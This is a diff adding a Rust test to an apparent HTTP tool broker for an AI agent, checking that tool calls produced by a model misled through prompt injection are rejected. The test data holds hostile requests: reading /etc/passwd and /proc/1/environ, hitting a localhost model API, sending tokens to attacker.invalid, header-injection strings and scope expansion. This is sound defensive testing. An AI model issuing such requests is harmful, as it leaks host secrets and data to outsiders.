@@ -1202,6 +1202,29 @@ mod tests {
         assert!(count.evidence.is_empty());
         assert_eq!(count.reserved, 0);
     }
+
+    #[tokio::test]
+    async fn injected_tool_arguments_cannot_expand_scope_or_extract_host_files() {
+        let broker = broker();
+        // Simulate a model obeying hostile webpage/login text. The boundary must
+        // reject the resulting tool call even when the model has been misled.
+        for body in [
+            json!({"method":"GET","url":"file:///etc/passwd"}),
+            json!({"method":"GET","url":"http://127.0.0.1:11434/api/tags"}),
+            json!({"method":"GET","url":"https://example.com@attacker.invalid/collect"}),
+            json!({"method":"GET","url":"https://attacker.invalid/?token=untrusted-target-text"}),
+            json!({"method":"GET","url":"https://example.com/","headers":{"X-Forwarded-Host":"internal\r\nAuthorization: injected"}}),
+            json!({"method":"GET","url":"https://example.com/","headers":{"Proxy-Authorization":"injected"}}),
+            json!({"method":"GET","url":"https://example.com/","command":"cat /proc/1/environ"}),
+            json!({"method":"GET","url":"https://example.com/","scope":{"origins":["https://attacker.invalid"]}}),
+        ] {
+            assert!(broker.http(body).await.is_err());
+        }
+        let counters = broker.counters.lock().unwrap();
+        assert_eq!(counters.calls, 0);
+        assert_eq!(counters.reserved, 0);
+        assert!(counters.evidence.is_empty());
+    }
     #[test]
     fn dns_answers_are_rechecked_and_mixed_private_answers_are_rejected() {
         let public: SocketAddr = "1.1.1.1:443".parse().unwrap();
